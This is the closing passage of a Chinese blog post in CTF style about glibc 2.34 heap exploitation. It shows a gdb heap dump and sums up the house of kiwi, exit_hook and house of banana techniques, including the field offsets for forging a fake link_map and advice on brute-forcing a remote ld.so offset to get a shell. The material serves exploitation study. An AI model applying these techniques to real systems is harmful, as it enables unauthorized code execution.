class=\"number\">0030</span>│  <span class=\"number\">0x55a656f072d0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│  <span class=\"number\">0x55a656f072d8</span> ◂— <span class=\"number\">0x41</span> </span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0040</span>│  <span class=\"number\">0x55a656f072e0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">09</span>:<span class=\"number\">0048</span>│  <span class=\"number\">0x55a656f072e8</span> —▸ <span class=\"number\">0x55a656f072f8</span> —▸ <span class=\"number\">0x7f56e4244cec</span> (execvpe+<span class=\"number\">652</span>) ◂— mov    rdx, r12</span><br><span class=\"line\"><span class=\"number\">0</span>a:<span class=\"number\">0050</span>│  <span class=\"number\">0x55a656f072f0</span> ◂— <span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"number\">0b</span>:<span class=\"number\">0058</span>│  <span class=\"number\">0x55a656f072f8</span> —▸ <span class=\"number\">0x7f56e4244cec</span> (execvpe+<span class=\"number\">652</span>) ◂— mov    rdx, r12</span><br><span class=\"line\"><span class=\"number\">0</span>c:<span class=\"number\">0060</span>│  <span class=\"number\">0x55a656f07300</span> ◂— <span class=\"number\">0xa</span> /</span><br><span class=\"line\"><span class=\"number\">0</span>d:<span class=\"number\">0068</span>│  <span class=\"number\">0x55a656f07308</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0</span>e:<span class=\"number\">0070</span>│  <span class=\"number\">0x55a656f07310</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0f</span>:<span class=\"number\">0078</span>│  <span class=\"number\">0x55a656f07318</span> ◂— <span class=\"number\">0x41</span></span><br><span class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0080</span>│  <span class=\"number\">0x55a656f07320</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓     <span class=\"number\">6</span> skipped</span><br><span class=\"line\"><span class=\"number\">17</span>:<span class=\"number\">00b</span>8│  <span class=\"number\">0x55a656f07358</span> ◂— <span class=\"number\">0x41</span></span><br><span class=\"line\"><span class=\"number\">18</span>:<span class=\"number\">00</span>c0│  <span class=\"number\">0x55a656f07360</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓     <span class=\"number\">6</span> skipped</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│  <span class=\"number\">0x55a656f07398</span> ◂— <span class=\"number\">0x41</span> </span><br><span class=\"line\"><span class=\"number\">20</span>:<span class=\"number\">0100</span>│  <span class=\"number\">0x55a656f073a0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">21</span>:<span class=\"number\">0108</span>│  <span class=\"number\">0x55a656f073a8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">22</span>:<span class=\"number\">0110</span>│  <span class=\"number\">0x55a656f073b0</span> —▸ <span class=\"number\">0x55a656f072e0</span> \t<span class=\"comment\">//l_info[26]</span></span><br><span class=\"line\"><span class=\"number\">23</span>:<span class=\"number\">0118</span>│  <span class=\"number\">0x55a656f073b8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">24</span>:<span class=\"number\">0120</span>│  <span class=\"number\">0x55a656f073c0</span> —▸ <span class=\"number\">0x55a656f072e8</span>  <span class=\"comment\">//l_info[28]</span></span><br><span class=\"line\"><span class=\"number\">25</span>:<span class=\"number\">0128</span>│  <span class=\"number\">0x55a656f073c8</span> ◂— <span class=\"number\">0xa</span> </span><br><span class=\"line\"><span class=\"number\">26</span>:<span class=\"number\">0130</span>│  <span class=\"number\">0x55a656f073d0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">27</span>:<span class=\"number\">0138</span>│  <span class=\"number\">0x55a656f073d8</span> ◂— <span class=\"number\">0x41</span> </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最后我们就是利用 onegadget 获得 shell 了。</p>\n<p>利用 gdb 万能必挂点，结合 one_gadget 工具帮助我们快速找到合适的 one_gadget</p>\n<p><img data-src=\"./p5.png\" alt=\"p5\"></p>\n<h5 id=\"一些注意点\"><a class=\"markdownIt-Anchor\" href=\"#一些注意点\">#</a> 一些注意点：</h5>\n<p>​\t因为_rtld_global 这个符号是存在与 ld.so 文件中，往往出题人不会给出 ld.so 文件，，rtld_global_ptr 与 libc_base 的偏移在本地与远程并不是固定的，可能会在地址的第 2 字节处发生变化，因此可以爆破 256 种可能得到远程环境的精确偏移</p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h2>\n<p>​\t\t本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本 Glibc-2.34 0ubuntu3.2 的可行性。因为 2.34 主要问题还是在于一些 hook 函数被禁止，以及对_IO_str_finish、_IO_str_overflow 变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位 ctfer 来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在 3.2 版本之前，我们依旧可以通过修改 vtable 劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个 hook 的符号，而是其他的符号)。house of kiwi, 攻击 exit_hook 依旧是可以实现，且比较方便的。</p>\n<p>​\t后面我这里主要介绍了 house of banana, 这项技术，依旧是用于 3.2，并且向下兼容。简要概括，就是修改第三个节点的 l_next 为堆地址 fake，并在该堆上伪造第四个节点。</p>\n<p>伪造 link_map</p>\n<ol>\n<li>​\t\t\t\t *(fake+0x28)=fake。</li>\n<li>​\t\t\t\t*(fake +0x48)=fake+0x58,   *(fake+0x50) = 0x8</li>\n<li>​\t\t\t\t*(fake+0x58) = shell</li>\n<li>​\t\t\t\t*(fake+0x110) = fake+0x40</li>\n<li>​\t\t\t\t*(fake+0x120) = fake+0x48</li>\n<li>​\t\t\t\t(int)*(fake+0x31c) = 0x9</li>\n</ol>\n<p>最后笔者在这里提出一个未完成的验证，house of emma 在 3.2 版本下的利用.</p>\n<p>​\t\t因为个人实力依旧比较菜，文章出可能会出现错误及不足，欢迎斧正。也希望能和对此文感兴趣的师傅进一步交流关于新版本的利用姿势。</p>\n<p>​\t[参考]：</p>\n<p>​\t想到验证各种姿势，感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydWFuNzc3LmdpdGh1Yi5pby8=\"> ru7n</span> 师傅</p>\n<p>​\t3.2 下攻击 exit_hook 的思考，感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjQ4Mzc4Nz90eXBlPWJsb2c=\"> Ayaka</span> 师傅</p>\n<p>​\thouse of banana 的最初构想\t感谢<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL21lbWJlci8xNDY4Nzg=\"> ha1vk</span> 师傅</p>\n",
            "tags": [
                "pwn"
            ]
        }
    ]
}